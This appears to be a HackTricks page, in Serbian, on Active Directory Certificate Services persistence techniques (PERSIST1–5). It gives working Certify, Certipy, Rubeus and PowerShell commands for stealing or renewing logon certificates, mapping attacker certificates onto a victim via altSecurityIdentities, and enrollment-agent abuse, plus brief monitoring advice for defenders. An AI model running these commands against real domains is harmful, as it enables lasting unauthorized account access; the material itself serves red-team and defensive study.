# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Ovo je kratak sažetak poglavlja o persistence naloga iz odličnog istraživanja dostupnog na [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**<sup>[[7]](#references)</sup>

## Razumevanje krađe akreditiva aktivnog korisnika pomoću sertifikata – PERSIST1

U scenariju u kojem korisnik može da zatraži sertifikat koji omogućava autentifikaciju na domenu, napadač ima priliku da zatraži i ukrade ovaj sertifikat kako bi održao persistence na mreži. Podrazumevano, `User` template u Active Directory dozvoljava takve zahteve, iako ponekad može biti onemogućen.<sup>[[3]](#references)[[7]](#references)</sup>

Korišćenjem alata [Certify](https://github.com/GhostPack/Certify) ili [Certipy](https://github.com/ly4k/Certipy), možete pretražiti omogućene template-e koji dozvoljavaju autentifikaciju klijenta, a zatim zatražiti jedan:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Moć sertifikata leži u njegovoj sposobnosti da autentifikuje korisnika kojem pripada, bez obzira na promene lozinke, sve dok sertifikat ostaje važeći.

Možete konvertovati PEM u PFX i koristiti ga za dobijanje TGT-a:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Napomena: U kombinaciji sa drugim tehnikama (pogledajte odeljke THEFT), autentifikacija zasnovana na sertifikatima omogućava postojan pristup bez pristupanja LSASS-u, čak i iz konteksta bez povišenih privilegija.

## Dobijanje postojanosti mašine pomoću sertifikata - PERSIST2

Ako napadač ima povišene privilegije na hostu, može da upiše kompromitovani sistemski machine account za sertifikat pomoću podrazumevanog `Machine` template-a. Autentifikacija kao machine omogućava S4U2Self za lokalne servise i može obezbediti dugotrajnu postojanost na hostu:<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Produžavanje Persistence kroz obnovu sertifikata - PERSIST3

Zloupotreba perioda važenja i obnove sertifikatskih predložaka omogućava napadaču da održi dugoročan pristup. Ako posedujete prethodno izdat sertifikat i njegov privatni ključ, možete ga obnoviti pre isteka kako biste dobili nove, dugotrajne credentials, bez ostavljanja dodatnih tragova zahteva povezanih sa prvobitnim principalom.<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operativni savet: Pratite vek trajanja PFX datoteka koje su pod kontrolom napadača i obnavljajte ih ranije. Obnavljanje takođe može dovesti do toga da ažurirani sertifikati sadrže modernu ekstenziju za mapiranje SID-a, čime ostaju upotrebljivi pod strožim pravilima DC mapiranja (pogledajte sledeći odeljak).

## Postavljanje eksplicitnih mapiranja sertifikata (altSecurityIdentities) – PERSIST4

Ako možete da upisujete u atribut `altSecurityIdentities` ciljanog naloga, možete eksplicitno mapirati sertifikat pod kontrolom napadača na taj nalog. Ovo opstaje nakon promene lozinke i, kada se koriste formati za snažno mapiranje, ostaje funkcionalno i pod modernim DC enforcement-om.<sup>[[2]](#references)</sup>

Tok na visokom nivou:

1. Nabavite ili izdajte client-auth sertifikat koji kontrolišete (npr. enroll `User` template kao sebe).
2. Izdvojite snažan identifikator iz sertifikata (Issuer+Serial, SKI ili SHA1-PublicKey).
3. Dodajte eksplicitno mapiranje na `altSecurityIdentities` principala žrtve koristeći taj identifikator.
4. Autentifikujte se sertifikatom; DC će ga mapirati na žrtvu putem eksplicitnog mapiranja.

Primer (PowerShell) koji koristi snažno Issuer+Serial mapiranje:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Zatim se autentifikujte pomoću svog PFX fajla. Certipy će direktno pribaviti TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Izgradnja jakih `altSecurityIdentities` mapiranja

U praksi, mapiranja **Issuer+Serial** i **SKI** najlakši su jaki formati za izgradnju na osnovu certificate-a koji poseduje attacker. Ovo je važno nakon **11. februara 2025.**, kada DC-ovi podrazumevano prelaze na **Full Enforcement**, a slaba mapiranja prestaju da budu pouzdana.<sup>[[1]](#references)</sup>
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Napomene
- Koristite samo tipove strong mapping: `X509IssuerSerialNumber`, `X509SKI` ili `X509SHA1PublicKey`. Slabi formati (Subject/Issuer, samo Subject, RFC822 email) su zastareli i mogu biti blokirani pravilima DC-a.
- Mapping funkcioniše i na **user** i **computer** objektima, tako da je write access nad `altSecurityIdentities` computer naloga dovoljan za persistence kao ta mašina.
- Lanac sertifikata mora da se izgradi do root sertifikata kojem DC veruje. Enterprise CA-ovi u NTAuth se obično smatraju pouzdanim; neka okruženja veruju i javnim CA-ovima.
- Schannel authentication ostaje koristan za persistence čak i kada PKINIT ne uspe zato što DC nema Smart Card Logon EKU ili vraća `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### 2025+ eksplicitni `Issuer/SID` mapping-i

Na **Windows Server 2022+** domain controller-ima na koje je instaliran Microsoft bezbednosni update od **9. septembra 2025.**, Microsoft je dodao još jedan strong format eksplicitnog mapping-a koji je privlačan za persistence jer opstaje nakon ponovnog izdavanja sertifikata od strane istog CA-a:<sup>[[6]](#references)</sup>
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operativno, ovo se razlikuje od starijih strong formata:
- `Issuer+Serial` vezuje **jedan tačno određeni sertifikat**.
- `SKI` / `SHA1-PUKEY` vezuju **jedan par ključeva**.
- `Issuer/SID` vezuje **CA koji izdaje sertifikat + ciljni SID**, tako da obnovljeni ili ponovo izdati sertifikati istog CA nastavljaju da rade bez ponovnog upisivanja `altSecurityIdentities`.

Zahtevi i napomene
- Sertifikat predstavljen za logon mora zaista sadržati SID ciljnog naloga u SID security ekstenziji.
- Ovaj format nije koristan za sertifikate tipa `ESC9` / `ESC16` koji izostavljaju SID ekstenziju; u tim slučajevima koristite `Issuer+Serial`, `SKI` ili `SHA1-PUKEY`.

Za više informacija o slabim eksplicitnim mapiranjima i attack path-ovima pogledajte:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent kao Persistence – PERSIST5

Ako dobijete važeći Certificate Request Agent/Enrollment Agent sertifikat, možete po potrebi izdavati nove sertifikate sposobne za logon u ime korisnika i držati agent PFX offline kao persistence token. Workflow zloupotrebe:<sup>[[7]](#references)</sup>
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Opoziv agent sertifikata ili dozvola šablona je neophodan za uklanjanje ove perzistencije.

Operativne napomene
- Moderne verzije alata `Certipy` podržavaju i `-on-behalf-of` i `-renew`, tako da napadač koji poseduje Enrollment Agent PFX može da izda leaf sertifikate, a zatim da ih obnavlja bez ponovnog pristupanja originalnom ciljnom nalogu.<sup>[[4]](#references)</sup>
- Ako PKINIT-based TGT retrieval nije moguć, dobijeni on-behalf-of sertifikat se i dalje može koristiti za Schannel authentication pomoću `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.<sup>[[5]](#references)</sup>

## Korišćenje perzistentnih sertifikata kada PKINIT ne uspe

Ako DC nema sertifikat koji podržava Smart Card Logon, certificate logon putem PKINIT-a može da ne uspe sa greškom `KDC_ERR_PADATA_TYPE_NOSUPP`. To **ne uklanja** persistence primitive: isti PFX se često i dalje može koristiti za Schannel-authenticated LDAP access.<sup>[[5]](#references)</sup>
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Ovo je naročito korisno nakon PERSIST4/PERSIST5, jer možete nastaviti rad iz Linux/macOS okruženja i povezati druge radnje persistence u direktorijumu, kao što su postavljanje [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) ili izmena atributa delegiranja koji dozvoljavaju upis.

## 2025 Strong Certificate Mapping Enforcement: Uticaj na Persistence

Microsoft KB5014754 je uveo Strong Certificate Mapping Enforcement na kontrolerima domena. Od **11. februara 2025.**, DC-ovi podrazumevano koriste **Full Enforcement** za slaba/dvosmislena mapiranja, a od bezbednosnog ažuriranja od **9. septembra 2025.** zakrpljeni DC-ovi više ne podržavaju stari fallback u Compatibility režimu.<sup>[[1]](#references)</sup> Praktične posledice:

- Sertifikati pre 2022. godine koji nemaju SID mapping ekstenziju mogu biti neuspešno implicitno mapirani kada DC-ovi koriste Full Enforcement. Napadači mogu održati pristup obnavljanjem sertifikata putem AD CS-a (kako bi dobili SID ekstenziju) ili postavljanjem strong eksplicitnog mapiranja u `altSecurityIdentities` (PERSIST4).
- Eksplicitna mapiranja koja koriste strong formate (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` i, na modernim DC-ovima, `Issuer/SID`) i dalje funkcionišu. Slabi formati (Issuer/Subject, Subject-only, RFC822) mogu biti blokirani i treba ih izbegavati za persistence.
- Ako slaba mapiranja i dalje deluju funkcionalno, pretpostavite da ste naišli na nezakrpljeni ili drugačije konfigurisan DC, a ne na pouzdanu dugoročnu persistence putanju.
- Putanje izdavanja u stilu `ESC9` / `ESC16`, koje potiskuju SID ekstenziju, čine `Issuer/SID` neupotrebljivim, pa fallback strong mapiranja ili obnavljanje putem normalnog template-a predstavljaju praktičnu opciju za persistence.

Administratori treba da nadgledaju i generišu upozorenja za:
- Promene atributa `altSecurityIdentities` i izdavanje/obnavljanje Enrollment Agent i User sertifikata.
- CA logove izdavanja za on-behalf-of zahteve i neuobičajene obrasce obnavljanja.

## Reference

- [1] [Microsoft Support – KB5014754: Promene autentifikacije zasnovane na sertifikatima na Windows kontrolerima domena](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
